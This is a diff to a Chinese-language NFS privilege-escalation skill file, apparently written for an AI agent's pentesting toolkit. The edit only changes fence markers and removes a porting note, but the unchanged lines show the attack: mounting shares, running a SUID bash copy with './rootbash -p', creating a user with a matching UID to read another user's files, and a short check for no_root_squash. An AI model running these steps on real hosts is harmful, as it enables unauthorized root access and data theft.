@@ -4,7 +4,6 @@ description: 'NFS提权：no_root_squash→SUID bash。UID匹配绕过文件权�
 disable-model-invocation: true
 metadata: { domain: linux, tier: T2 }
 ---
-> 📌 DSH 适配：本技能移植自 RS。原 read_skill/run_skill 调用 = 用 DSH 的 skill 工具按名加载对应技能；fleet/kali-mcp = 用 bash 后台任务与 subagent 工具实现。
 
 ## NFS 提权
 
@@ -18,7 +17,7 @@ showmount -e target                   # 列出共享
 mkdir /tmp/nfs; mount -t nfs target:/share /tmp/nfs
 # 如果挂载失败 → 检查版本
 mount -t nfs target:/share /tmp/nfs -o vers=3
-```
+```text
 
 ### no_root_squash 提权
 ```bash
@@ -39,7 +38,7 @@ useradd -u <target_uid> attacker
 su attacker
 cd /tmp/nfs
 ./rootbash -p
-```
+```text
 
 ### NFS 读限制文件
 ```bash
@@ -48,7 +47,7 @@ cd /tmp/nfs
 useradd -u 1001 victim
 su victim
 cat /tmp/nfs/home/victim/user.txt
-```
+```text
 
 ### 检测
 ```bash
@@ -56,4 +55,4 @@ cat /tmp/nfs/home/victim/user.txt
 cat /etc/exports
 # /share *(rw,no_root_squash)        ← 危险
 # /share *(rw,sync)                  ← root_squash（安全）
-```
+```text
